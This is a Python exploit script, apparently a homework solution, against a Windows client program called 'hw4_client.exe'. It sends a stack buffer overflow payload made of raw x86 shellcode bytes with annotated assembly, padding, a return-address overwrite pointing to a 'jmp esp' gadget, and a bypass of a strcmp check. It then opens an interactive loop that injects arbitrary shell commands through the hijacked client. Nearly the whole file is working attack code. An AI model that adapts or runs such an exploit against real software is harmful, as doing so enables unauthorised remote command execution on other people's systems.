import subprocess
import time

def initial_attack():
    # Command to run the executable
    command = 'hw4_client.exe'

    shellcode = b"\xBC\x1C\x9D\x5F\x00\x81\xEC\x00\x04\x00\x00\x89\xE3\x54\x68\x68\x61\x50\x62\xE8\x9C\xAE\xF0\x61\x6A\x00\x68\x80\x80\x50\x62\x53\x6A\x07\xFF\x75\x08\xE8\x48\x7B\xF0\x61\x81\xC4\x1C\x04\x00\x00\xEB\xD3"
    """
    The shell code is:
        mov esp, 0x5F9D1C (move esp below shellcode)
    start_of_shell_code:
        sub esp, 0x400
        mov ecx, esp
        push esp
        push 0x62506168
        call 0x62504BD4 (scanf, change to relative call)
        push 0
        push 0x62508080
        push ecx
        push 7
        push [ebp+8]
        call 0x62501892 (func that communicates with server, change to relative call)
        add esp, 0x41C
        jmp start_of_shell_code
    """

    # Input to be provided to the program
    input_data = b'uArcher\n18A0PYCZURBVJDQE\nPEEK\n'
    input_data += shellcode
    input_data += b'A' * (0x3FAC - len(shellcode))
    input_data += b'\x7C\xFD\x5F\x00' + b'\x28\x20\x50\x62' # override ret adrr to "jmp esp" gadget
    input_data += b'\xEB\x06\x00\x00' # jmp +6 to avoid next 4 bytes when code is running
    input_data += b'\x20\x9D\x5F\x00' # override pointer argument with pointer to our buffer so strcmp will do nothing
    input_data += b'\xE9\x3F\xC0\xFF\xFF\n' # jmp to start of the scanned buffer (where we put our shellcode)

    # Run the command and provide input
    process = subprocess.Popen(command, stdin=subprocess.PIPE)
    #time.sleep(20)

    process.stdin.write(input_data)
    process.stdin.flush()
    return process

def run_shell_command(process, user_command=None):
    if user_command == None:
        user_command = input()
    
    if user_command == "exit":
        return False

    input_data = str.encode(user_command)
    input_data = b". > $null ; " + input_data + b"\n"

    if len(input_data) > (0x400 - 1):
        print("Command is too long. Try again")
    
    process.stdin.write(input_data)
    process.stdin.flush()
    return True

if __name__ == "__main__":
    process = initial_attack()
    do_not_exit = True
    while do_not_exit:
        do_not_exit = run_shell_command(process)

    process.stdin.close()
    process.kill()